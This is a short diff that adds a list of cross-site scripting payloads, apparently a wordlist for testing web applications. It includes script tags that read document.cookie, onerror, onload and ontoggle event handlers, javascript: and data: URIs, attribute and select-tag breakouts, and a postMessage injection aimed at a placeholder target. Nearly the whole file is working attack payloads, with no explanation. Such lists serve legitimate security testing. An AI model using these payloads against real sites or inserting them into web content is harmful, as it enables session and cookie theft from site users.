@@ -1,0 +1,14 @@
+#default=<script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+/option></select><img src='x' onerror​='alert(1)'>
+<img src='x' onerror​='alert(1)'>
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<svg><svg onload=alert(1)>
+data:text/html,<img src=1 onerror=alert(1)>
+data:text/html,<iframe src=javascript:alert(1)>
+<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
+"><svg onload=alert(1)>
+javascript:alert(document.cookie)
+\"-alert(1)}//
